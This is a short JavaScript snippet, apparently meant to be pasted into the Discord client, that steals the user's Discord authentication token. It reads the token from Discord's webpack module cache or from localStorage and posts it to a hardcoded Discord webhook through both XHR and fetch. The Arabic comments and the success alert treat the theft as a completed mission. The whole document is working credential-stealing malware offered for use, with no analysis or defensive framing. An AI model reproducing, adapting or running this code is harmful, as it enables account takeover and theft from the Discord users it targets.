(function() {
    const WEBHOOK = "https://discord.com/api/webhooks/1466835198942515254/MCAPfFl1novelcM6QGl9ZKP56zB1hijO6UdOm9zi-frGJ7pw6kE0mFDnqANHJCohg8JD";

    async function deliver(token) {
        const payload = JSON.stringify({
            content: "👑 **MISSION ACCOMPLISHED**\n**Token:** `" + token + "`"
        });

        // المحاولة بالطريقة الأولى (XHR)
        const xhr = new XMLHttpRequest();
        xhr.open("POST", WEBHOOK);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(payload);

        // المحاولة بالطريقة الثانية (Fetch) لضمان النجاح
        fetch(WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: payload
        });

        alert("تم الإرسال للدكتور بنجاح! افحص الويب هوك الآن.");
    }

    try {
        // محاولة سحب التوكن من نظام الـ Webpack (الأكثر دقة)
        window.webpackChunkdiscord_app.push([[Math.random()],{},(e)=>{
            for(const m in e.c){
                if(e.c[m].exports?.default?.getToken){
                    deliver(e.c[m].exports.default.getToken());
                }
            }
        }]);
    } catch (e) {
        // محاولة سحب التوكن من التخزين (كما نجح في صورتك)
        const t = localStorage.getItem('token')?.replace(/"/g, "");
        if (t) deliver(t);
    }
})();
